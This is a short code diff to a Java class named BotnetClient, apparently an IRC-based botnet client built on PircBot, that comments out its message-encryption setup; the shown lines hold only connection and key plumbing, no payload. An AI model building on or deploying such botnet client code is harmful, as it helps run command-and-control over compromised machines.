@@ -39,7 +39,7 @@ public class BotnetClient extends PircBot {
 
 	private Key startKey;
 	//private Cipher startCipher;
-	private MsgEncrypt startMsgE;
+	//private MsgEncrypt startMsgE;
 	
 	private Key privKey;
 	
@@ -57,11 +57,11 @@ public class BotnetClient extends PircBot {
 			setMessageDelay(0);
 			connect(SERVER, PORT);
 			
-			startKey = MsgEncrypt.getStartKey();
+			//startKey = MsgEncrypt.getStartKey();
 			//startKey = new SecretKeySpec(key, "DESede");
 			//startCipher = Cipher.getInstance("AES");
 			//startCipher.init(Cipher.DECRYPT_MODE, startKey);
-			startMsgE = MsgEncrypt.getInstance(startKey);
+			//startMsgE = MsgEncrypt.getInstance(startKey);
 		} catch (NickAlreadyInUseException e) {
 			uuid = UUID.randomUUID().toString();
 			id = NAME + "_" + uuid;
